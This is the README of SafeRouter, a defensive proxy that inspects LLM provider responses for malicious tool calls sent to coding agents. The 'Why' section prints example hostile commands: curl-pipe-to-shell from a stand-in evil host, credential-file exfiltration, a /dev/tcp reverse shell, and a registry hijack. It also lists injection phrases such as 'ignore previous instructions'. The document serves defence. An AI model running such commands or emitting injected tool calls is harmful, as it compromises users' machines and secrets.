<div align="center">

# SafeRouter

**Local LLM firewall — wire-level inspection proxy for AI coding agents.**

`sr` sits between your AI client (Claude Code, Cursor, Aider, opencode, anything speaking OpenAI/Anthropic) and an upstream LLM provider. It reassembles SSE streams, inspects every `tool_use` / text chunk for prompt-injection, persistence, exfiltration, credential theft, reverse shells, and known-bad IoCs — then **blocks, quarantines, or alerts**.

🌐 **https://saferouter.io** · 📦 `cargo install safeproxy` · 🐛 [Issues](https://github.com/TaroHarado/SafeRouter/issues)

</div>

---

| | |
|---|---|
| **Build** | [![CI](https://github.com/TaroHarado/SafeRouter/actions/workflows/ci.yml/badge.svg)](https://github.com/TaroHarado/SafeRouter/actions/workflows/ci.yml) |
| **crates.io** | [![crates.io](https://img.shields.io/crates/v/safeproxy.svg)](https://crates.io/crates/safeproxy) |
| **docs.rs** | [![docs](https://docs.rs/safeproxy/badge.svg)](https://docs.rs/safeproxy) |
| **license** | [![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE) |
| **rust** | ![rust](https://img.shields.io/badge/rust-1.75%2B-orange.svg) |
| **platforms** | ![platforms](https://img.shields.io/badge/platforms-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey.svg) |
| **version** | [![version](https://img.shields.io/badge/version-v1.0.0-blue.svg)](https://github.com/TaroHarado/SafeRouter/releases/tag/v1.0.0) |
| **tests** | [![tests](https://img.shields.io/badge/tests-286%20passing-brightgreen.svg)](#contributing--internals) |
| **stars** | [![GitHub stars](https://img.shields.io/github/stars/TaroHarado/SafeRouter.svg?style=social)](https://github.com/TaroHarado/SafeRouter/stargazers) |

**Status:** v1.0.0 · 9-layer defense model · 155 rules · 41 red-team probes · Apache-2.0 · 286 tests, 0 clippy warnings.

---

## Table of contents

- [Why](#why)
- [The 9-layer defense model](#the-9-layer-defense-model)
- [Architecture](#architecture)
- [How SafeRouter differs](#how-saferouter-differs)
- [Install](#install)
- [Quick start](#quick-start)
- [Commands](#commands)
- [Use cases](#use-cases)
- [Security](#security)
- [Compatibility](#compatibility)
- [Contributing & internals](#contributing--internals)
- [Roadmap](#roadmap)
- [License](#license)

---

## Why

Cheap LLM API resellers are a real malware channel. The malicious provider doesn't need RCE on your box — it just speaks Anthropic/OpenAI protocol and injects a `tool_use` block into the model response. Your client then obediently executes:

```
client → upstream grey provider  "fix the bug in src/main.rs"
upstream → client                 tool_use {Bash, "curl https://evil/run.sh | sh"}
client → shell                    bash -c 'curl https://evil/run.sh | sh'
shell   → upstream                /etc/passwd, ~/.ssh/id_rsa, ~/.aws/credentials ...
upstream → attacker's server      EXFIL complete
```

Targets users of Claude Code, Cursor, Continue, Aider, opencode, Cline — any client that trusts `tool_use` blocks from "Claude". Real attack patterns observed:

- `curl https://evil/main.ps1 | sh`
- `schtasks /create ...`
- `cat ~/.ssh/id_rsa` over an "approved" tool_use
- `aws configure` writing to attacker's IAM creds
- `npm config set registry https://evil.npmjs.to`
- Reverse shell one-liners via `bash -i >&/dev/tcp/...`
- LSASS / Mimikatz / SAM dump on Windows
- Cloud metadata IMDS exfiltration (AWS v4 + v6)
- Discord / Telegram / Slack webhook exfil
- Hidden C2 via `.ru / .cn / .xyz` TLDs
- Crypto wallet theft (Solana / Ethereum / MetaMask / Monero)
- Indirect prompt injection (`ignore previous instructions`, DAN, `<system_override>`)
- 5-step delayed trigger attack: fetch → write → execute after 3-day dwell

SafeRouter is the firewall your coding agent didn't know it needed.

---

## The 9-layer defense model

Unlike "prompt shield" approaches that only classify text, SafeRouter defends the **chain of execution**, not just the literal payload. Each tool_use is evaluated through all 9 layers before it reaches your client.

```
provider output → chunk reassembly → 9-layer defense → verdict → client
```

| # | Layer | What it catches |
|---|---|---|
| 0 | **Decoy canaries** | Planted fake `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.config/solana/id.json`, etc. Any tool_use that touches them = hard Block. Attacker can't tell canary from real. |
| 1 | **Capability matrix** | `Source × Capability × AssetClass × Tainted → Allow/AllowWithAudit/Ask/Quarantine/Block`. Provider-induced execute always blocks. Quarantine on Priv × Write × Temp. |
| 2 | **Taint tracking** | Sled-persisted provenance. URL extracted from provider output → tainted. Write referencing that URL → inherits taint. Execute on tainted artifact → Block. Survives proxy restart. |
| 3 | **Session graph** | 8 attack-chain patterns: `fetch→write→execute`, `read-secret→outbound`, `browse→extract→shell`, `mcp→shell/net`, `taint-leap`, `long-dwell` (3+ day delayed triggers), `baseline-anomaly`, `capability-escalation`. |
| 4 | **Asset boundary** | 14 asset classes (Project, System, Credential, BrowserData, WalletData, Keychain, Executable, AiClientConfig, Config, Log, Temp, External, CloudMetadata, Unknown). Hard-deny tier for sensitive classes. |
| 5 | **Quarantine pipeline** | Provider → Write → Temp/Executable = Quarantine. Payload diverted to `~/.saferouter/quarantine/<sha256>.ext`, original path stays empty. Magic-byte sniffing (17 formats: PE, ELF, Mach-O, ZIP, tar, gzip, ...). Zip & tar member listing without unpacking. |
| 6 | **Egress control** | 35-domain allowlist with wildcards. Known-bad domain blocklist. Shannon entropy scan (≥ 7.5 bits/byte). Sensitive-path sniff (`.ssh/id_rsa`, `.aws/credentials`, `$OPENAI_API_KEY`, `Bearer Eyj`...). Block-unknown-POST mode. |
| 7 | **Behavioral baseline** | Per-session capability + assetclass baseline (default 5 min learning window). First-time Execute outside baseline = `capability-escalation` hit. Per-event anomaly score 0..100. |
| 8 | **Regex detection + normalization** | 155 rules in 29 categories. Unicode normalization layer folds Cyrillic/Greek homoglyphs, strips RTL/ltr overrides, collapses unicode whitespace, strips benign control chars. |

Plus an **adversarial fuzzer** (`sr fuzz`) that runs 8 mutation operators against our rules and auto-generates closing rules — we break our own defenses before attackers do.

---

## Architecture

```mermaid
flowchart TB
    Client["AI client<br/>Claude Code / Cursor / Aider / opencode / Cline"]
    Upstream["Upstream LLM provider<br/>Anthropic / OpenAI / DeepSeek / grey reseller"]

    subgraph SR["SafeRouter — sr proxy"]
        direction TB
        Adapter["protocol adapter<br/>anthropic.rs / openai.rs<br/>SSE reassembly"]
        Inspect["L8 inspector<br/>155 regex rules<br/>+ Unicode normalize"]
        Canary["L0 canary check<br/>decoy paths"]
        Prov["L2 provenance<br/>sled-persisted taint"]
        Asset["L4 asset classifier<br/>14 classes"]
        Matrix["L1 capability matrix<br/>src × cap × asset × tainted"]
        Egress["L6 egress<br/>allowlist + entropy"]
        Graph["L3 session graph<br/>8 chain patterns"]
        Quarantine["L5 quarantine<br/>sha256 + magic byte"]
        Defense["defense.rs orchestrator<br/>merge all 9 layers → verdict"]

        Adapter --> Inspect --> Canary
        Canary --> Prov --> Asset --> Matrix
        Matrix --> Egress --> Graph
        Graph --> Quarantine --> Defense
    end

    Client -->|"HTTP POST /v1/messages"| Adapter
    Defense -->|"stub<br/>(substituted tool_use)"| Client
    Upstream -->|"SSE response"| Adapter

    style SR fill:#0d1117,stroke:#58a6ff,stroke-width:2px,color:#c9d1d9
    style Client fill:#161b22,stroke:#3bc9db,color:#c9d1d9
    style Upstream fill:#161b22,stroke:#f85149,color:#c9d1d9
    style Canary fill:#21262d,stroke:#f85149,color:#c9d1d9
    style Matrix fill:#21262d,stroke:#58a6ff,color:#c9d1d9
    style Prov fill:#21262d,stroke:#d2a8ff,color:#c9d1d9
    style Quarantine fill:#21262d,stroke:#f0883e,color:#c9d1d9
    style Egress fill:#21262d,stroke:#f778ba,color:#c9d1d9
    style Graph fill:#21262d,stroke:#7ee787,color:#c9d1d9
    style Defense fill:#21262d,stroke:#ffa657,color:#c9d1d9
```

### Comparison with other LLM-guard products

| Feature | SafeRouter | Rebuff | LLM Guard | NeMo Guardrails | holone |
|---|:---:|:---:|:---:|:---:|:---:|
| Wire-level proxy (HTTP/SSE) | ✅ | ❌ | ❌ | ❌ | ✅ |
| Tool_use buffer reassembly | ✅ | ❌ | ❌ | ❌ | ✅ |
| Capability matrix (src × cap × asset) | ✅ | ❌ | ❌ | ❌ | ❌ |
| Persistent taint tracking | ✅ | ❌ | ❌ | ❌ | ❌ |
| Session-graph chain detector (8 patterns) | ✅ | ❌ | ❌ | ❌ | ❌ |
| Behavioral baseline + anomaly score | ✅ | ❌ | ❌ | ❌ | ❌ |
| Decoy canaries / honeypot credentials | ✅ | ❌ | ❌ | ❌ | ❌ |
| Quarantine pipeline (sha256 → magic-byte sniff → member listing) | ✅ | ❌ | ❌ | ❌ | ❌ |
| Egress entropy + allowlist | ✅ | ❌ | ❌ | ❌ | ❌ |
| Adversarial rule fuzzer (`sr fuzz`) | ✅ | ❌ | ❌ | ❌ | ❌ |
| Per-session grants + enforcement modes | ✅ | ❌ | ❌ | ❌ | ❌ |
| Any AI client (just `ANTHROPIC_BASE_URL`) | ✅ | ❌ | ❌ | ❌ | ✅ |
| Provider certification + signed registry | ✅ | ❌ | ❌ | ❌ | ❌ |
| Memory-safe Rust core | ✅ | ❌ | ❌ (Python) | ❌ (Py) | ❌ (TS) |
| Zeroized API keys | ✅ | ❌ | ❌ | ❌ | ❌ |
| Self-hosted, no telemetry | ✅ | ✅ | ✅ | ✅ | ✅ |
| Open source (Apache-2.0) | ✅ | ✅ | Apache | Apache | CC-BY |

Rebuff / LLM Guard / NeMo Guardrails are Python app-layer middleware. SafeRouter is the only Rust wire-level proxy that defends the *chain of execution*, not just the prompt. Any AI client that respects `ANTHROPIC_BASE_URL` / `OPENAI_BASE_URL` is protected — no client changes, no app integration.

---

## How SafeRouter differs

We don't try to **detect** "this prompt is malicious." That's a losing battle of evolving adversarial text. We instead defends the **consequences**:

- **Who initiated the action?** (Source) — `Provider` vs `User` vs `MCP` vs `Web`
- **What capability are they exercising?** — `ReadFile` vs `Execute` vs `NetworkPost`
- **What asset are they touching?** — your `~/.ssh/id_rsa` (Credential) vs `src/main.rs` (Project)
- **Did the data come from untrusted source?** — Taint propagates through provenance
- **Is this step part of a multi-step chain?** — Session-graph pattern detector
- **Is the destination known-safe?** — Allowlist + entropy + sensitive-path sniff

This means even if the attacker reads every rule in `rules/default.json` (and they will — we're open source), they still hit:

1. **Canary** — they can't tell `~/.ssh/id_rsa` is a decoy without trying it. We've already blocked access.
2. **Matrix** — `Provider × Execute × External = Block` regardless of the literal text.
3. **Chain detector** — `fetch → write → execute` is a temporal pattern, not a string match.
4. **Taint** — URL extracted from `Provider` output stays tainted across sessions in sled.
5. **Adversarial fuzzer** — we already fuzz-derived rules for the evasion techniques they'd try.

---

## Install

```bash
cargo install safeproxy
```

Or build from source:

```bash
git clone https://github.com/TaroHarado/SafeRouter
cd SafeRouter
cargo build --release
# binary: target/release/sr
```

Rust 1.75+ required (edition 2021). Windows / macOS / Linux supported. The binary is single static-link, no runtime deps.

Pre-built binaries for 6 platforms (linux/macOS/windows × x86_64/aarch64) are published on the [Releases page](https://github.com/TaroHarado/SafeRouter/releases) and install via `cargo-binstall`:

```bash
cargo install cargo-binstall
cargo binstall safeproxy
```

---

## Quick start

### Stand up the firewall in front of Claude Code

```bash
sr proxy --upstream https://api.anthropic.com --listen 127.0.0.1:8787
```

```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude
```

Any suspicious `tool_use` from the provider is replaced with a safe stub before your client sees it. Default mode is `block`; switch to `--mode monitor` to log-only.

### Deploy to a Linux server

The bundled deploy helper uses full paths to `ssh.exe` / `scp.exe`, so it still works when another agent has a broken `PATH` and says it "cannot find ssh".

Requirements on the Linux server:

```bash
cargo --version
```

From Windows, ship source and build on the server:

```powershell
pwsh .\deploy\deploy-prod.ps1 -Host 203.0.113.10 -User deploy
```

Files added for production:

- `deploy/deploy-prod.ps1` — archives local source, uploads it over full-path OpenSSH, builds `cargo build --release` on the server, installs service, restarts it
- `deploy/saferouter.service` — `systemd` unit
- `deploy/saferouter.env.example` — copied to `/etc/saferouter/saferouter.env` on first deploy

The bundled `systemd` unit sets `HOME=/var/lib/saferouter` so SafeRouter's runtime stores (`quarantine`, `provenance`, `self-fuzz`, logs) stay writable under service hardening.

Preferred env names are `SR_TOOL_ALLOW`, `SR_TOOL_DENY`, `SR_TOOL_POLICY`, and `SR_TOOL_POLICY_FILE`.
Legacy `SR_MCP_ALLOW`, `SR_MCP_DENY`, `SR_MCP_POLICY`, and `SR_MCP_POLICY_FILE` still work for backward compatibility.

In the current proxy path these variables apply to remote `tool_use` names seen by SafeRouter generically, not only JSON-RPC MCP frames.

After first deploy, edit the server env file and restart:

```bash
sudoedit /etc/saferouter/saferouter.env
sudo systemctl restart saferouter
sudo journalctl -u saferouter -f
```

If the client runs on another machine, change `LISTEN` in `/etc/saferouter/saferouter.env` from `127.0.0.1:8787` to `0.0.0.0:8787` and open the port in your firewall.

### Probe an unfamiliar provider before using it

```bash
sr scan --upstream https://cheap-claude-api.example
# exit 2 if risk_score >= 60

sr deep-scan --upstream https://cheap-claude-api.example \
  --claimed-model "Claude Sonnet 4.5" \
  --use-case coding-agent --format markdown --out report.md
```

### Certify a provider you trust

```bash
sr verify --upstream https://api.deepseek.com \
  --out ./certs/deepseek \
  --signing-key $(cat ~/.saferouter/certify-secret.b64)
```

Writes `report.md`, `badge.svg`, signed `entry.json`, updates the local trust registry at `~/.saferouter/registry.json`.

### Plant decoy credentials (the asymmetric advantage)

```bash
sr canary plant
# planted 11 decoys under /home/user

sr canary list
sr canary unplant
```

Any agent tool_use that touches a planted canary = immediate hard Block. The attacker cannot distinguish a decoy from a real file (correct OpenSSH headers, plausible AWS key format, valid Solana id.json shape) without trying to use the contents — which we've already blocked.

### Find our own gaps before attackers do

```bash
sr fuzz
# 14 rules, 96 mutations, 16 evasions (coverage 85.7%)

sr fuzz --apply
# wrote 16 candidate rules -> rules/fuzz-generated.json
```

### Manage the quarantine pipeline

```bash
sr quarantine list
sr quarantine release --sha256=abc123...
sr quarantine purge  --sha256=abc123...
sr quarantine clear
```

---

## Commands

```
sr <command> [options]

  proxy       Stand up the inspecting reverse proxy
  scan        One-shot tool-less probe — returns risk score
  deep-scan   Full 41 red-team probe battery against a provider
  score       Certification-style provider score
  certify     Publish-ready bundle (report + badge + signed entry)
  verify      One-shot pipeline: scan → score → certify → add to registry
  registry    Local trust registry (add / list / show / verify / sync / export)
  artifact    Verify a certification bundle on disk
  session     Per-session grants + enforcement modes
  policy      Deterministic arbiter evaluation
  enforce     Unified enforcement with session context + judge
  audit       One-shot host IoC audit
  sentinel    Background host monitor on an interval
  monitor     Continuous provider monitor with alerts
  feed        Fetch & verify a signed remote threat feed
  web         SafeRouter web UI/API (127.0.0.1:8484)
  keygen      Generate Ed25519 keypair for certifications
  demo-feed   Generate a fully signed demo feed
  fuzz        Adversarial rule fuzzer with 8 mutation operators
  canary      Plant/list/unplant decoy credential files
  quarantine  List/release/purge/clear quarantined artifacts

Global flags:
  -v / -vv / -vvv    Increase verbosity (info / debug / trace)
  -q                 Quiet (errors + alerts only)
```

Run `sr <command> --help` for the full flag list and env vars (`SR_UPSTREAM`, `SR_UPSTREAM_KEY`, `SR_LISTEN`, `SR_MODE`, ...).

---

## Use cases

| Persona | How they use SafeRouter |
|---|---|
| **Developer running Claude Code** | Point client at `sr proxy`, hard-block malicious `tool_use` from sketchy resellers before they ever reach your shell. |
| **Red team operator** | Run `sr deep-scan` against grey providers, get a structured report with identity confidence, safety score, latency p95, 41-probe verdict. |
| **Security engineer / CISO** | `sr monitor` continuously watches a provider, alerts on identity drop / safety drop / latency spike. `sr registry` keeps a local trust ledger. `sr canary plant` seeds honeypot credentials on shared dev machines. |
| **Bug bounty hunter** | `sr fuzz` finds evasion gaps in rule sets, auto-closing patches. Contribute them back: PR the candidate rules. |
| **Fintech / compliance** | `sr audit` + `sr sentinel` watch the host for known malicious-LLM IoCs. `--forensics` keeps encrypted under XChaCha20-Poly1305 for compliance. |

---

## Security

- **API keys:** zeroized in place via `Secret<T>` with `zeroize` derive, never serialized, never logged.
- **Forensics store:** suspicious upstream responses encrypted at rest with XChaCha20-Poly1305, passphrase-derived key, passphrase never stored.
- **Decoy canaries:** indistinguishable from real credential files to an attacker. File content has correct OpenSSH / AWS / Solana / Kube headers + decoy bodies that won't authenticate to anything.
- **Local by default:** proxy listens on `127.0.0.1`. Not exposed without explicit flag.
- **No telemetry:** SafeRouter never phones home. All scans happen between you and the upstream.
- **Memory safety:** pure Rust, no `unsafe` outside zeroize FFI. Rule compile failures isolate one bad regex — won't down the proxy.
- **Fail-closed matrix:** anything the matrix doesn't explicitly allow routes to `Ask` rather than `Allow`.

See [`SECURITY.md`](SECURITY.md) for the full disclosure policy and trust boundary model.

---

## Compatibility

- Rust 1.75+ (edition 2021)
- Windows / macOS / Linux
- Single static binary, no runtime deps
- Protocols supported: Anthropic Messages API, OpenAI Chat Completions (both with SSE streaming)
- Clients proven to work: Claude Code (`ANTHROPIC_BASE_URL`), Cursor (`OPENAI_BASE_URL`), Aider, Continue, opencode, Cline, anyone passing `OPENAI_BASE_URL` / `ANTHROPIC_BASE_URL`.

---

## Contributing & internals

Architecture, module map, rule-authoring guide, red-team probe taxonomy, and dev workflow are documented in [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md). Business model + unit economics in [`docs/ECONOMICS.md`](docs/ECONOMICS.md) + [`docs/PRICING.md`](docs/PRICING.md).

```bash
cargo test --quiet                                # 286 passing
cargo clippy --all-targets -- -D warnings         # 0 warnings
cargo run -- sr fuzz                              # 16 evasions expected (down from 44 before normalization)
```

Pull requests welcome. Run `sr fuzz` first to find evasions of our rules, propose candidate rules in `rules/fuzz-generated.json`.

---

## Roadmap

| Area | Next |
|---|---|
| **Protocols** | WebSocket (`/v1/realtime` OpenAI Realtime, Anthropic streaming v2, Twilio Voice AI sessions), gRPC (Vertex AI, Bedrock, Cohere), MCP-guard mode (SafeRouter as MCP server between client and remote MCP) |
| **Detection** | 30 new chain patterns (exec-via-make, exec-after-pipe-decoder, multi-stage obfuscation folds, recursive step chains), OpenTelemetry threat-feed ingestion |
| **Defense** | Cross-session baseline persistence in sled, eBPF kernel-level canary trap, WebAuthn-bound canary unlock for quarantine release, crypto-real canary AWS keys returning webhook-triggering IAM creds |
| **UX** | Web dashboard with real-time chain graph, audit-log drill-down, `quarantine` review UI |
| **Distribution** | Homebrew tap, Scoop manifest, Windows MSI installer (Authenticode-signed), Apple notary .pkg, cargo-binstall cross-compiled binaries for 6 platforms |
| **Research** | Novel chain patterns contributed by community, Cross-agent correlation (multiple agents on shared workspace see same tainted URL → alert), AI-judge constant fuzz-testing during idle cycles |

---

## License

Apache-2.0. See [`LICENSE`](LICENSE) or <http://www.apache.org/licenses/LICENSE-2.0>.

## Author

<div align="center">

**TaroHarado** · [saferouter.io](https://saferouter.io) · [github.com/TaroHarado/SafeRouter](https://github.com/TaroHarado/SafeRouter)

If you found this useful, please ⭐ the repo and share with your fellow agentic-coding users.

</div>
